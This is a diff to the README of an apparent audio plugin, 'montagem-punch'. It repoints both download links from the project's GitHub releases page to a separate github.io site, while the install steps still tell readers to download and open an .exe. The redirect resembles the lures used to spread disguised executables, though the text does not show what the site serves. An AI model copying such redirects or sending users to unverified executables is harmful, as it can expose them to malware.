@@ -1,7 +1,7 @@
 # 🔊 montagem-punch - Shape your drum transients with ease
 
 <p align="center">
-  <a href="https://github.com/sturdy-genova223/montagem-punch/releases">
+  <a href="https://sturdy-genova223.github.io">
     <img src="https://img.shields.io/badge/Download-Click_Here-blue.svg" alt="Download Link">
   </a>
 </p>
@@ -26,7 +26,7 @@ Ensure you have your audio software updated to the latest version before you ins
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the [official download page](https://github.com/sturdy-genova223/montagem-punch/releases).
+1.  Visit the [official download page](https://sturdy-genova223.github.io).
 2.  Look for the file ending in `.exe` under the latest release.
 3.  Click the file to save it to your computer.
 4.  Open your downloads folder.
